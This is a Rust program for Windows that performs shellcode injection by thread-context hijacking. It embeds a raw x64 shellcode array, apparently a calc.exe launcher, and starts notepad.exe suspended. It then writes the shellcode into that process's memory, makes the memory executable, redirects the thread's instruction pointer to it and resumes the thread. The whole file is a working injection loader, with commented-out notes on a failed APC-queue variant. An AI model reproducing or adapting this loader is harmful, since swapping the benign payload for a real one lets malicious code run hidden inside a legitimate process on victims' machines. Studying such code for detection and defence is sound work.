use std::ffi::OsString;
use std::os::windows::prelude::{ OsStrExt };
use std::{ ptr, mem, io };
use winapi;
use winapi::shared::minwindef::DWORD;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::VirtualAllocEx;
use winapi::um::minwinbase::{ SECURITY_ATTRIBUTES };
use winapi::um::processthreadsapi::{
    PROCESS_INFORMATION,
    STARTUPINFOW,
    CreateProcessW,
    GetThreadContext,
};
use winapi::um::winbase::CREATE_SUSPENDED;
use winapi::um::winnt::{ CONTEXT_FULL, CONTEXT };

const SHELL_CODE: [u8; 276] = [
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
    0x65, 0x78, 0x65, 0x00,
];

fn main() {
    let mut process_info = PROCESS_INFORMATION {
        hProcess: ptr::null_mut(),
        hThread: ptr::null_mut(),
        dwProcessId: 0,
        dwThreadId: 0,
    };

    let cmd = OsString::from("notepad.exe");
    let mut cmd_vec: Vec<u16> = cmd.encode_wide().collect();
    cmd_vec.push(0);

    let mut startup_info = STARTUPINFOW {
        cb: std::mem::size_of::<STARTUPINFOW>() as u32,
        lpReserved: ptr::null_mut(),
        lpDesktop: ptr::null_mut(),
        lpTitle: ptr::null_mut(),
        dwX: 0,
        dwY: 0,
        dwXSize: 0,
        dwYSize: 0,
        dwXCountChars: 0,
        dwYCountChars: 0,
        dwFillAttribute: 0,
        dwFlags: 0,
        wShowWindow: 0,
        cbReserved2: 0,
        lpReserved2: ptr::null_mut(),
        hStdInput: ptr::null_mut(),
        hStdOutput: ptr::null_mut(),
        hStdError: ptr::null_mut(),
    };

    use winapi::um::securitybaseapi::{ InitializeSecurityDescriptor, SetSecurityDescriptorDacl };
    use winapi::um::winnt::{ SECURITY_DESCRIPTOR };

    // Define a variable to hold the security descriptor
    let mut security_descriptor = SECURITY_DESCRIPTOR {
        Revision: 0,
        Sbz1: 0,
        Control: 0,
        Owner: ptr::null_mut(),
        Group: ptr::null_mut(),
        Sacl: ptr::null_mut(),
        Dacl: ptr::null_mut(),
    };

    // Initialize the security descriptor
    unsafe {
        InitializeSecurityDescriptor(std::mem::transmute(&mut security_descriptor), 1);
    }

    // Set the DACL to allow full access to the thread handle
    unsafe {
        SetSecurityDescriptorDacl(
            &mut security_descriptor as *mut SECURITY_DESCRIPTOR as *mut winapi::ctypes::c_void,
            1,
            0 as *mut _,
            0
        );
    }

    let mut security_attributes = SECURITY_ATTRIBUTES {
        nLength: mem::size_of::<SECURITY_ATTRIBUTES>() as DWORD,
        lpSecurityDescriptor: &mut security_descriptor as *mut SECURITY_DESCRIPTOR as *mut _,
        bInheritHandle: 1,
    };

    let create_success = unsafe {
        CreateProcessW(
            ptr::null_mut(),
            cmd_vec.as_mut_ptr(),
            &mut security_attributes,
            ptr::null_mut(),
            1,
            CREATE_SUSPENDED,
            ptr::null_mut(),
            ptr::null_mut(),
            &mut startup_info,
            &mut process_info
        )
    };

    if create_success == 0 {
        // handle error
        println!("Error creating process: {}", unsafe { GetLastError() });
    } else {
        // process was created successfully in a suspended state
        println!("Process created successfully");

        //make a pointer of the thread handle
        //let thread_handle_ptr = &mut process_info.hThread;

        //get the thread handle
        //let thread_handle = unsafe {*thread_handle_ptr};
        let pid = process_info.dwProcessId;
        let process_handle = process_info.hProcess;
        let thread_handle = process_info.hThread;

        println!("Process ID: {}", pid);
        println!("Process Handle: {:x?}", process_handle);
        println!("Thread Handle: {:x?}", thread_handle);

        println!("Allocating memory in the process...");

        //allocate memory in the process
        unsafe {
            let shell_ptr = VirtualAllocEx(
                process_handle,
                ptr::null_mut(),
                (SHELL_CODE.len() as u32).try_into().unwrap(),
                winapi::um::winnt::MEM_COMMIT,
                winapi::um::winnt::PAGE_READWRITE
            );

            // prepare shell_ptr for use in QueueUserAPC with winapi::um::winnt::PAPCFUNC

            //get error
            //let error = winapi::um::errhandlingapi::GetLastError();
            //println!("Error: {}", error);

            //write the shellcode to the process

            let mut written_bytes = 0;

            println!("Writing shellcode to process memory...");

            winapi::um::memoryapi::WriteProcessMemory(
                process_handle,
                shell_ptr,
                SHELL_CODE.as_ptr() as *const _,
                (SHELL_CODE.len() as u32).try_into().unwrap(),
                &mut written_bytes
            );

            //get error
            //let error = winapi::um::errhandlingapi::GetLastError();
            //println!("Error: {}", error);

            //im starting to think QueueUserAPC is the problem and this is not going to work in Rust

            /* 
    let apc_routine: winapi::um::minwinbase::PTHREAD_START_ROUTINE = Some(shell_ptr_con);

    winapi::um::processthreadsapi::QueueUserAPC(apc_routine, thread_handle, 0 as usize);
        //get error
        let error = winapi::um::errhandlingapi::GetLastError();
        println!("Error: {}", error); */

            println!("Modifying memory protection...");

            //change memory protection to execute
            let mut old_protect = 0;
            winapi::um::memoryapi::VirtualProtectEx(
                process_handle,
                shell_ptr,
                (SHELL_CODE.len() as u32).try_into().unwrap(),
                winapi::um::winnt::PAGE_EXECUTE_READ,
                &mut old_protect
            );

            let mut context = CONTEXT {
                ContextFlags: CONTEXT_FULL, // Only retrieve the instruction pointer and stack pointer
                ..std::mem::zeroed() // Zero out the rest of the struct
            };
            // Get the thread context
            let _success = GetThreadContext(thread_handle, &mut context as *mut CONTEXT);

            //get last error
            //println!("Error: {}", GetLastError());

            println!("Setting thread context to shellcode...");

            winapi::um::processthreadsapi::GetThreadContext(thread_handle, &mut context);

            //get rip
            let _rip = context.Rip;

            //setthreadcontext to shellcode
            context.Rip = shell_ptr as u64;

            winapi::um::processthreadsapi::SetThreadContext(thread_handle, &mut context);

            println!("\nPress any key to resume thread...");
            let mut input = String::new();
            io::stdin().read_line(&mut input).expect("Failed to read line");

            winapi::um::processthreadsapi::ResumeThread(thread_handle);
        }
    }
}
